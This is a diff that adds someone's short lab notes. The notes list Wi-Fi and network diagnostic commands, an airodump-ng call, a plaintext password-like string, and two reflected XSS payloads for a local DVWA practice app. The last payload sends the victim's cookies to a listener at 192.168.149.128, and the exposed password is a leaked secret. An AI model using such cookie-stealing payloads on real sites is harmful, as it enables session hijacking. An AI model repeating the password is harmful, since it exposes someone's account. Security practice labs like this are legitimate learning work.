@@ -1,0 +1,20 @@
+ubuntu
+ifconfig
+iwconfig
+====================================
+windows
+netsh wlan show interfaces
+netsh wlan show drivers
+netsh wlan show networks
+netsh wlan show profiles
+airodump-ng name
+tracert thesslstore.com
+=============================================
+Password
+kj773A25EA[A;e2Je[y?tzn5Xy5@+zaD
+
+
+--------------------------------------------
+<code>http://localhost:81/DVWA/vulnerabilities/xss_r/?name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>
+------------------------------------------
+<span style="color: #ff0000;"><code><span style="color: #ff0000;">http://localhost:81/DVWA/vulnerabilities/xss_r/?name=&lt;script&gt;new</span></code> </span> <span style="color: #ff0000;"><code><span style="color: #ff0000;">Image().src="http://192.168.149.128/bogus.php?output="+document.cookie;&lt;/script&gt;</span></code></span>
